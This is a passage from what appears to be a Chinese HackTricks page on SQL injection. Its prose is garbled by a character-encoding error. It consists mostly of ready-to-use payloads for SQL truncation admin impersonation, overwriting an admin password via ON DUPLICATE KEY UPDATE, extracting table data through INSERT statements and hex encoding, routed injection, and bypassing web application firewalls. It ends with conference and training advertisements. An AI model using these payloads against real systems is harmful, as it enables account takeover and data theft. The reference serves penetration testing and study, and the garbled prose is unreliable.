* **SQLæˆªæ–­æ”»å‡»**ï¼ˆå½“ç”¨æˆ·åæˆ–ç”µå­é‚®ä»¶æœ‰æŸç§**é•¿åº¦é™åˆ¶**æ—¶ï¼‰--> åˆ›å»ºåä¸ºï¼š**admin \[å¤§é‡ç©ºæ ¼] a**çš„ç”¨æˆ·

#### SQLæˆªæ–­æ”»å‡»

å¦‚æœæ•°æ®åº“å­˜åœ¨æ¼æ´ï¼Œå¹¶ä¸”ç”¨æˆ·åçš„æœ€å¤§å­—ç¬¦æ•°ä¾‹å¦‚ä¸º30ï¼Œè€Œæ‚¨æƒ³è¦å†’å……ç”¨æˆ·**admin**ï¼Œè¯·å°è¯•åˆ›å»ºä¸€ä¸ªåä¸ºï¼šâ€œ_admin \[30ä¸ªç©ºæ ¼] a_â€çš„ç”¨æˆ·åå’Œä»»ä½•å¯†ç ã€‚

æ•°æ®åº“å°†**æ£€æŸ¥**è¾“å…¥çš„**ç”¨æˆ·å**æ˜¯å¦**å­˜åœ¨**äºæ•°æ®åº“ä¸­ã€‚å¦‚æœ**ä¸å­˜åœ¨**ï¼Œå®ƒå°†**æˆªæ–­****ç”¨æˆ·å**åˆ°**æœ€å¤§å…è®¸å­—ç¬¦æ•°**ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ä¸ºï¼šâ€œ_admin \[25ä¸ªç©ºæ ¼]_â€ï¼‰ï¼Œç„¶åå®ƒå°†**è‡ªåŠ¨åˆ é™¤æœ«å°¾çš„æ‰€æœ‰ç©ºæ ¼ï¼Œæ›´æ–°**æ•°æ®åº“ä¸­çš„ç”¨æˆ·â€œ**admin**â€ä¸**æ–°å¯†ç **ï¼ˆå¯èƒ½ä¼šå‡ºç°ä¸€äº›é”™è¯¯ï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€è¿™æ²¡æœ‰æˆåŠŸï¼‰ã€‚

æ›´å¤šä¿¡æ¯ï¼š[https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_æ³¨æ„ï¼šåœ¨æœ€æ–°çš„MySQLå®‰è£…ä¸­ï¼Œæ­¤æ”»å‡»å°†ä¸å†æŒ‰ä¸Šè¿°æ–¹å¼å·¥ä½œã€‚è™½ç„¶æ¯”è¾ƒä»ç„¶é»˜è®¤å¿½ç•¥å°¾éšç©ºæ ¼ï¼Œä½†å°è¯•æ’å…¥ä¸€ä¸ªè¶…è¿‡å­—æ®µé•¿åº¦çš„å­—ç¬¦ä¸²å°†å¯¼è‡´é”™è¯¯ï¼Œæ’å…¥å°†å¤±è´¥ã€‚æœ‰å…³æ­¤æ£€æŸ¥çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§ï¼š[https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### MySQLæ’å…¥åŸºäºæ—¶é—´çš„æ£€æŸ¥

æ ¹æ®æ‚¨çš„è€ƒè™‘ï¼Œæ·»åŠ å°½å¯èƒ½å¤šçš„`','',''`ä»¥é€€å‡ºVALUESè¯­å¥ã€‚å¦‚æœæ‰§è¡Œäº†å»¶è¿Ÿï¼Œåˆ™æ‚¨æœ‰SQLæ³¨å…¥ã€‚
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

`ON DUPLICATE KEY UPDATE` å­å¥åœ¨ MySQL ä¸­ç”¨äºæŒ‡å®šå½“å°è¯•æ’å…¥ä¸€è¡Œä¼šå¯¼è‡´ UNIQUE ç´¢å¼•æˆ– PRIMARY KEY ä¸­çš„é‡å¤å€¼æ—¶ï¼Œæ•°æ®åº“åº”é‡‡å–çš„æ“ä½œã€‚ä»¥ä¸‹ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨æ­¤åŠŸèƒ½ä¿®æ”¹ç®¡ç†å‘˜å¸æˆ·çš„å¯†ç ï¼š

ç¤ºä¾‹æœ‰æ•ˆè´Ÿè½½æ³¨å…¥ï¼š

æœ‰æ•ˆè´Ÿè½½å¯èƒ½è¢«æ„é€ å¦‚ä¸‹ï¼Œå…¶ä¸­å°è¯•å°†ä¸¤è¡Œæ’å…¥ `users` è¡¨ã€‚ç¬¬ä¸€è¡Œæ˜¯è¯±é¥µï¼Œç¬¬äºŒè¡Œé’ˆå¯¹ç°æœ‰ç®¡ç†å‘˜çš„ç”µå­é‚®ä»¶ï¼Œç›®çš„æ˜¯æ›´æ–°å¯†ç ï¼š
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Here's how it works:

- æŸ¥è¯¢å°è¯•æ’å…¥ä¸¤è¡Œï¼šä¸€è¡Œä¸º `generic_user@example.com`ï¼Œå¦ä¸€è¡Œä¸º `admin_generic@example.com`ã€‚
- å¦‚æœ `admin_generic@example.com` çš„è¡Œå·²ç»å­˜åœ¨ï¼Œ`ON DUPLICATE KEY UPDATE` å­å¥ä¼šè§¦å‘ï¼ŒæŒ‡ç¤º MySQL æ›´æ–°ç°æœ‰è¡Œçš„ `password` å­—æ®µä¸º "bcrypt_hash_of_newpassword"ã€‚
- å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨ `admin_generic@example.com` å°è¯•èº«ä»½éªŒè¯ï¼Œå¯†ç å¯¹åº”äº bcrypt å“ˆå¸Œï¼ˆ"bcrypt_hash_of_newpassword" ä»£è¡¨æ–°å¯†ç çš„ bcrypt å“ˆå¸Œï¼Œåº”æ›¿æ¢ä¸ºæ‰€éœ€å¯†ç çš„å®é™…å“ˆå¸Œï¼‰ã€‚

### æå–ä¿¡æ¯

#### åŒæ—¶åˆ›å»º 2 ä¸ªè´¦æˆ·

åœ¨å°è¯•åˆ›å»ºæ–°ç”¨æˆ·æ—¶ï¼Œéœ€è¦ç”¨æˆ·åã€å¯†ç å’Œç”µå­é‚®ä»¶ï¼š
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### ä½¿ç”¨åè¿›åˆ¶æˆ–åå…­è¿›åˆ¶

ä½¿ç”¨æ­¤æŠ€æœ¯ï¼Œæ‚¨å¯ä»¥ä»…åˆ›å»º 1 ä¸ªå¸æˆ·æ¥æå–ä¿¡æ¯ã€‚é‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œæ‚¨ä¸éœ€è¦æ³¨é‡Šä»»ä½•å†…å®¹ã€‚

ä½¿ç”¨ **hex2dec** å’Œ **substr**ï¼š
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
è¦è·å–æ–‡æœ¬ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
ä½¿ç”¨ **hex** å’Œ **replace**ï¼ˆä»¥åŠ **substr**ï¼‰ï¼š
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) æ˜¯ **è¥¿ç­ç‰™** æœ€ç›¸å…³çš„ç½‘ç»œå®‰å…¨äº‹ä»¶ï¼Œä¹Ÿæ˜¯ **æ¬§æ´²** æœ€é‡è¦çš„äº‹ä»¶ä¹‹ä¸€ã€‚ è¯¥å¤§ä¼š **æ—¨åœ¨ä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†**ï¼Œæ˜¯å„ä¸ªå­¦ç§‘æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«çš„çƒ­çƒˆäº¤æµå¹³å°ã€‚

{% embed url="https://www.rootedcon.com/" %}

## Routed SQL injection

Routed SQL injection æ˜¯ä¸€ç§æƒ…å†µï¼Œå…¶ä¸­å¯æ³¨å…¥æŸ¥è¯¢ä¸æ˜¯äº§ç”Ÿè¾“å‡ºçš„æŸ¥è¯¢ï¼Œè€Œæ˜¯å¯æ³¨å…¥æŸ¥è¯¢çš„è¾“å‡ºä¼ é€’ç»™äº§ç”Ÿè¾“å‡ºçš„æŸ¥è¯¢ã€‚ ([æ¥è‡ªè®ºæ–‡](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

ç¤ºä¾‹ï¼š
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF Bypass

[åˆå§‹ç»•è¿‡æ¥è‡ªè¿™é‡Œ](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### æ— ç©ºæ ¼ç»•è¿‡

æ— ç©ºæ ¼ (%20) - ä½¿ç”¨ç©ºç™½æ›¿ä»£å“è¿›è¡Œç»•è¿‡
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
æ— ç©ºæ ¼ - ä½¿ç”¨æ³¨é‡Šç»•è¿‡
```sql
?id=1/*comment*/and/**/1=1/**/--
```
æ— ç©ºæ ¼ - ä½¿ç”¨æ‹¬å·ç»•è¿‡
```sql
?id=(1)and(1)=(1)--
```
### æ— é€—å·ç»•è¿‡

æ— é€—å· - ä½¿ç”¨ OFFSETã€FROM å’Œ JOIN ç»•è¿‡
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### é€šç”¨ç»•è¿‡

ä½¿ç”¨å…³é”®å­—çš„é»‘åå• - ä½¿ç”¨å¤§å†™/å°å†™ç»•è¿‡
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
ä½¿ç”¨å…³é”®å­—çš„é»‘åå•ä¸åŒºåˆ†å¤§å°å†™ - ä½¿ç”¨ç­‰æ•ˆè¿ç®—ç¬¦ç»•è¿‡
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### ç§‘å­¦è®¡æ•°æ³• WAF ç»•è¿‡

æ‚¨å¯ä»¥åœ¨ [gosecure blog](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/) ä¸­æ‰¾åˆ°å¯¹æ­¤æŠ€å·§çš„æ›´æ·±å…¥è§£é‡Šã€‚\
åŸºæœ¬ä¸Šï¼Œæ‚¨å¯ä»¥ä»¥æ„æƒ³ä¸åˆ°çš„æ–¹å¼ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•æ¥ç»•è¿‡ WAFï¼š
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### ç»•è¿‡åˆ—åé™åˆ¶

é¦–å…ˆï¼Œè¯·æ³¨æ„ï¼Œå¦‚æœ**åŸå§‹æŸ¥è¯¢å’Œæ‚¨æƒ³è¦æå–æ ‡å¿—çš„è¡¨å…·æœ‰ç›¸åŒæ•°é‡çš„åˆ—**ï¼Œæ‚¨å¯ä»¥ç›´æ¥æ‰§è¡Œï¼š`0 UNION SELECT * FROM flag`

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢**åœ¨ä¸ä½¿ç”¨åˆ—åçš„æƒ…å†µä¸‹è®¿é—®è¡¨çš„ç¬¬ä¸‰åˆ—**ï¼š`SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`ï¼Œå› æ­¤åœ¨sqlinjectionä¸­ï¼Œè¿™çœ‹èµ·æ¥åƒï¼š
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
æˆ–ä½¿ç”¨ **comma bypass**ï¼š
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
è¿™ä¸ªæŠ€å·§æ¥è‡ªäº [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### WAF ç»•è¿‡å»ºè®®å·¥å…·

{% embed url="https://github.com/m4ll0k/Atlas" %}

## å…¶ä»–æŒ‡å—

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## æš´åŠ›ç ´è§£æ£€æµ‹åˆ—è¡¨

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) æ˜¯ **è¥¿ç­ç‰™** æœ€ç›¸å…³çš„ç½‘ç»œå®‰å…¨äº‹ä»¶ï¼Œä¹Ÿæ˜¯ **æ¬§æ´²** æœ€é‡è¦çš„äº‹ä»¶ä¹‹ä¸€ã€‚è¿™ä¸ªå¤§ä¼šçš„ **ä½¿å‘½æ˜¯ä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†**ï¼Œæ˜¯å„ä¸ªå­¦ç§‘æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«çš„ä¸€ä¸ªçƒ­çƒˆäº¤æµç‚¹ã€‚

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
